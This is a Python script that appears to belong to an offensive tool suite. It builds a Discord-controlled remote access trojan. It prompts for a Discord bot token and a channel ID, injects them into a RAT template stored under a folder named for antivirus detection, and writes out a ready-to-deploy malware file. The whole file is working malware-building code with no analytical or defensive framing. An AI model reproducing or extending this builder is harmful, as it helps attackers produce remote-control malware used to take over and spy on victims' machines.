from Config.Config import *
from Config.Util import *
from Config.Translates import *

current_language = LANGUAGE

def tr(key):
    return translations[current_language].get(key, key)

import os
import re

token = input(f"\n{INPUT} {tr('TokenBot')} -> {reset}")
channel_id = input(f"\n{INPUT} {tr('ChannelIDRAT')} -> {reset}")
output_filename = input(f"\n{INPUT} {tr('FileName')} -> {reset}")

output_filename += '.py'

source_file = 'Settings/FileDetectedByAntivirus/RAT.py'

with open(source_file, 'r', encoding='utf-8') as file:
    file_content = file.read()

file_content = re.sub(r"TOKEN\s*=\s*'.*'", f"TOKEN = '{token}'", file_content)
file_content = re.sub(r"CHANNEL_ID\s*=\s*['\"]?.*['\"]?", f"CHANNEL_ID = {channel_id}", file_content)

if "intents = discord.Intents.default()" not in file_content:
    file_content = file_content.replace("intents.message_content = True", "intents = discord.Intents.default()\nintents.message_content = True")

output_dir = '1-Output/Rat/'
os.makedirs(output_dir, exist_ok=True)

output_file = os.path.join(output_dir, output_filename)

with open(output_file, 'w', encoding='utf-8') as file:
    file.write(file_content)

print(f"{INFO} rat successfully registered in {reset}{output_file}\n")
Continue()
Reset()
